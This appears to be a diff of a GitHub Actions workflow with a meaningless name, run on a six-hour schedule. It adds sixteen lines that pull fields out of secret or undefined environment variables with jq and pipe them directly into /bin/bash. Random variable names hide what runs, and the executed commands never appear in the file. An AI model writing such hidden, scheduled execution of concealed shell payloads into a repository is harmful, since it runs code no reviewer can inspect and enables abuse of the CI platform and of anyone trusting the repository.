@@ -3,7 +3,8 @@ name: healthyouthful
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 1/6 * * *'
+    - cron: '57 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +13,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: healthyouthful
         env:
-          uqanf0: ${{ secrets.uqanf0 }}
+          nzt7581: ${{ secrets.nzt7581 }}
         run: |
-          echo $uqanf0 | jq -r .jw7 | /bin/bash
-          echo $xcbzv2 | jq -r .js59634 | /bin/bash
-          echo $eger886 | jq -r .zqhx5 | /bin/bash
-          echo $j6 | jq -r .lapd46015 | /bin/bash
-          echo $x46987 | jq -r .prka425 | /bin/bash
-          echo $uuv99 | jq -r .jw1092 | /bin/bash
-          echo $nwreq11413 | jq -r .d2 | /bin/bash
+          echo $nzt7581 | jq -r .ar3432 | /bin/bash
+          echo $osw200 | jq -r .wvz24 | /bin/bash
+          echo $ravlu2 | jq -r .fb10 | /bin/bash
+          echo $jwjma12 | jq -r .scy943 | /bin/bash
+          echo $nc416 | jq -r .rc77015 | /bin/bash
+          echo $uqk8 | jq -r .j1406 | /bin/bash
+          echo $hag442 | jq -r .gsx8139 | /bin/bash
+          echo $rnjdp060 | jq -r .eehyo9663 | /bin/bash
+          echo $oxbfa73 | jq -r .ue584 | /bin/bash
+          echo $zvkof4841 | jq -r .j8985 | /bin/bash
+          echo $bspx27 | jq -r .jddd0 | /bin/bash
+          echo $gvvm7 | jq -r .w0317 | /bin/bash
+          echo $qv1942 | jq -r .tuo831 | /bin/bash
+          echo $ojhjv35385 | jq -r .hrc8 | /bin/bash
+          echo $s72 | jq -r .bul46516 | /bin/bash
+          echo $ywud158 | jq -r .r440 | /bin/bash
 
